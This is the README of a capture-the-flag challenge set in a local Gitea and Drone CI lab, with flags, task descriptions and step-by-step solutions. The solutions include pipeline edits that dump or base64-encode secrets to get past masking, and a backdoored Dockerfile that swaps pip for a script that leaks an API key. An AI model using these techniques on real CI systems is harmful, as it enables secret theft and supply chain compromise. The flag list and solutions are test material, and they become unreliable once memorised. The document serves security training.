# EDS

DevOps tool based challenge with focus on Pipeline secrets and supply chain attack

## Flag(s)

- `DDC{W3LC0M3_T0_3MP0W3R1NG_D3V0P5_53CUR1TY_CH4LL3NG3}`
- `DDC{1_4M_4_M4CH1N3_1_D0_WH4T_1_4M_T0LD}`
- `DDC{BYP4SS1NG_PUSH_W1TH_4_PULL}`
- `DDC{B4CKD00R_1N_TH3_BU1LD}`

## Domain Names
- `devops.hkn`
- `git.devops.hkn`
- `drone.devops.hkn`
- `registry.devops.hkn`
- `internalgit.devops.hkn`
- `internaldrone.devops.hkn`
- `internalrunner.devops.hkn`
- `internalregistry.devops.hkn`

# Descriptions

## Empowering DevOps Security 2 del 1

Proposed difficulty: very easy

Welcome to the Empowering DevOps Security (EDS) team. We are exited to have you here!
To get you started, please have a look around the projects. I think you will find looking through the code enlightening.
We have created a new user for you:
username = Alice
password = password

[https://git.devops.hkn](https://git.devops.hkn)
[https://drone.devops.hkn](https://drone.devops.hkn)

## Empowering DevOps Security 2 del 2

Proposed difficulty: easy

Welcome to the Firelands, Drone Training Repository.
Here at EDS, we understand the importance of empowering developers like you with the knowledge and skills needed to succeed. That's why we've curated this comprehensive training repository specifically for the Drone tool – your gateway to mastering drone-based development and automation.
Whether you're a novice eager to learn the basics or an experienced developer looking to deepen your expertise, you'll find everything you need right here. Our training materials cover a wide range of topics, from setting up your first Drone pipeline to advanced automation techniques and best practices.

[https://git.devops.hkn](https://git.devops.hkn)
[https://drone.devops.hkn](https://drone.devops.hkn)

## Empowering DevOps Security 2 del 3

Proposed difficulty: medium

You have now become a brand new collaborator on the repository Abberus!
Abberus is an exciting place to be!
Here in the Abberus repository. We are working with a brand new Flask Application where we use drone for our pipeline. We use drone both for building, testing and deployment.
The pipeline is very restricted to the main branch and is only available for execution with the permission of senior developers! Please create a pull request if you want something changed and pushed into the newest version!
We are happy to have you on our team and look forward to many new good updates on our platform!

[https://git.devops.hkn](https://git.devops.hkn)
[https://drone.devops.hkn](https://drone.devops.hkn)

## Empowering DevOps Security 2 del 3

Proposed difficulty: medium-hard

Lastly, we would like for you to take a look at two other projects, Ulduar and Icecrown.
Ulduar is our newest flask app project. Please have a look around Ulduar, but don't touch anything as one of our other developers are quite uneasy about this project.
We figure that most python images are rater large, so we are working on developing our own for our Ulduar project to work with.
We would appreciate it if you would lend a hand finishing Iceccrown. 

[https://git.devops.hkn](https://git.devops.hkn)
[https://drone.devops.hkn](https://drone.devops.hkn)


## Proposed difficulty:

medium

## Prerequisites & Outcome

### Prerequisites

- Basic knowledge about DevOps or CI tool
- Basic Git knowledge
- Bash knowledge
- Basic docker knowledge (Mainly dockerfiles)

### Outcome

- Gain some experience with CI tools
- Learn some flaws with simple pipeline secret managers
- Learn about supply chain attacks and backdoors in code projects

## Solution(s)

### Empowering DevOps Security 2 del 1

Go to `git.devops.hkn` and go to the Firelands project. Open the flag.py file and there you should be able to find the flag.

### Empowering DevOps Security 2 del 2

- Log in as the given user on the Gitea server (Username = Alice, Password = password) and go to the Firelands repository
- The Firelands project itself contains a guide on how to do find the flag, (also serves as a helping hand in finding the others).
- Alternatively open the .drone.yml file and edit the file to look like this:
```
---
kind: pipeline
type: docker
name: Firelands-Pipeline

steps:
- name: docker
  image: registry.devops.hkn/docker:1
  commands:
    - printenv
```
- Then submit the file change and commit it to the main branch. 
- Go to `drone.devops.hkn` and log in with the same user.
- Find the Firelands pipeline and open the job that is / was just running on it and find the flag in the log output.

### Empowering DevOps Security 2 del 3

- Similar to the previous solution.
- Go to the Abberus and open the .drone.yml file and edit it to look something like this:
```
kind: pipeline
type: docker
name: default
steps:
- name: dockerPush
  image: registry.devops.hkn/docker:1
  commands:
  - echo "$PASSWORD" | base64
  environment:
    PASSWORD:
      from_secret: docker_password
    USERNAME:
      from_secret: docker_username
    when:
      branch:
      - main
      event:
      - push
      - pull_request
```
- The important parts are the environment from_secret and the echo command.
- Propose this as a file change on a new branch (since the main branch has a protection rule preventing you from pushing to it directly)
- Then make a pull request from the new branch into the main branch.
- This the pull requesst triggers a pipeline execution than can be seen on the drone server.
- In the log files for the Abberus job, the flag would be printed out in base64 format. 
- It is important that it is converted into base64, since drone would hide the explicid values of the secret.
- Simply decode the flag and then you have it.

### Empowering DevOps Security 2 del 4

- This last task is a supply chain attack task.
- The flag is hidden in a secret in the Ulduar pipeline, but the user does not have editing access to this project. 
- Notice that the Ulduar pipeline uses a custome image in one of its steps, and that the Icecrown project builds and pushes this image to the registry.
- Go to the Icecrown project and edit the Dockerfile to look like such:
```
FROM registry.devops.hkn/ubuntu:20.04
RUN echo "echo \$API_KEY | base64" > /usr/local/bin/pip
RUN chmod +x /usr/local/bin/pip
```
- Then commit and push it to the main branch of Icecrown.
- This triggers a pipeline execution that builds the image, tags and pushes it to the registry used by Uludar.
- Then wait for Ulduar to run a cron job (automatically triggers every 2 minutes) and see the base64 encrypted flag in the logs.
- Simply decode the flag and then you have it.

## How to run locally

This project was developped with linux in mind, so it might not work well for other OS.

You need docker installed on a linux computer.

- Open the terminal and go to the <path-to-project>/challenge/ folder.
- `docker compose build`
- `docker compose up -d`
- `docker network inspect bridge | grep Gateway`
- take the address found by the line above and add the following to you /etc/hosts file (please swap <address> for the acutal address): 
```
<address>       devops.hkn
<address>       git.devops.hkn
<address>       drone.devops.hkn
<address>       registry.devops.hkn
<address>       internalgit.devops.hkn
<address>       internaldrone.devops.hkn
<address>       internalrunner.devops.hkn
<address>       internalregistry.devops.hkn
```
- got to git.devops.hkn and drone.devops.hkn in you browser. 
- You should be able to see both a Gitea server and a Drone CI server
- Log in to the servers with username = Alice, password = password
- Now you should be ready to solve the challenges
